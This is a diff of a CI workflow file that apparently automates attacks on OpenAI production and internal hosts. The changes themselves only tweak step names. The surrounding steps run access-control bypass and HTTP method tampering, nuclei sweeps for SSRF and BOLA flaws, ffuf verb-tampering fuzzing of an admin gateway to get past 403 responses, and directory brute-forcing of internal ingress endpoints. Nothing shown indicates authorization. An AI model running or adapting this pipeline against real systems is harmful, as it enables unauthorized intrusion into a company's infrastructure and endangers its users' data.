@@ -21,7 +21,7 @@ jobs:
           curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints-res.txt -o wordlists/api.txt
           curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -o wordlists/common.txt
 
-      - name: Phase 1: Aggressive Bypass & Method Tampering
+      - name: Phase 1:Aggressive Bypass & Method Tampering
         run: |
           cat <<EOF > master_targets.txt
           https://api.openai.com/v1/completionsinternal
@@ -45,19 +45,19 @@ jobs:
             -path "//" \
             -sc -cl -title -o bypass_results.txt
 
-      - name: Phase 2: Vulnerability Sweep (SSRF/BOLA)
+      - name: Phase 2:Vulnerability Sweep (SSRF/BOLA)
         run: |
           # Adding -itags to focus specifically on high-value API vulnerabilities
           nuclei -l master_targets.txt -severity critical,high -rl 50 -o nuclei_results.txt
 
-      - name: Phase 3: Verb Tampering Fuzzing
+      - name: Phase 3:Verb Tampering Fuzzing
         run: |
           # Testing POST and PUT on the admin gateway, which often bypasses 403s on GET
           ffuf -w wordlists/api.txt -u "https://admin.unified-8.api.openai.com/FUZZ" \
             -X POST -H "Content-Type: application/json" -d '{"test":"test"}' \
             -mc 200,401,500 -maxtime 300 -o api_fuzz_results.json
 
-      - name: Phase 4: Full Path Discovery
+      - name: Phase 4:Full Path Discovery
         run: |
           # Looking for hidden directories on the Sci-Ingress endpoints
           ffuf -w wordlists/common.txt -u "https://memos.auth.ingress.sodium.sci.openai.org/FUZZ" \
